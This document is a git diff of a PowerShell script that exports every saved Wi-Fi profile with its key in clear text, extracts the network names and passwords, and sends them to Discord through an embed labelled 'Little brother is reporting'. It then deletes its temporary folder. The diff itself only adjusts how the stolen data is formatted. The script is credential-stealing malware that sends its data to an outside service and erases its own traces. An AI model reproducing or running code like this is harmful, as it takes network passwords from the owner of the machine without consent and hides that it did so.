@@ -27,8 +27,7 @@ $forEmbed =  [PSCustomObject]@{
     'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting: ' 
     'color'       = '16744960'
     'fields'   = @(@{
-    'value' = [string]$wifinames
-    }{
+    'name' = [string]$wifinames
     'value' = [string]$wifipass 
     })
 }
@@ -55,9 +54,9 @@ Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=c
 $originalOutput = Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} 
 $touchedOutput = $originalOutput.Replace("C:\Users\$env:username\AppData\Local\Temp\js2k3kd4nne5dhsk\", "")
 $loggedwifis = $touchedOutput -replace "\.xml.*?\:"
-$wifinames = $loggedwifis | select-string -Pattern '(Wi-Fi-.*:)' | ForEach-Object { $_.Matches.Value }
-$wifipass = $loggedwifis | select-string -Pattern '(:.*)' | ForEach-Object { $_.Matches.Value } 
-$wifipass.Replace(":", "")
+$wifinames = $loggedwifis | select-string -Pattern '(Wi-Fi-.*:)' | ForEach-Object { $_.Matches.Value } | Format-List
+$wifipass = $loggedwifis | select-string -Pattern '(:.*)' | ForEach-Object { $_.Matches.Value }
+$wifipass.Replace(":", "") | Format-List
 Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse
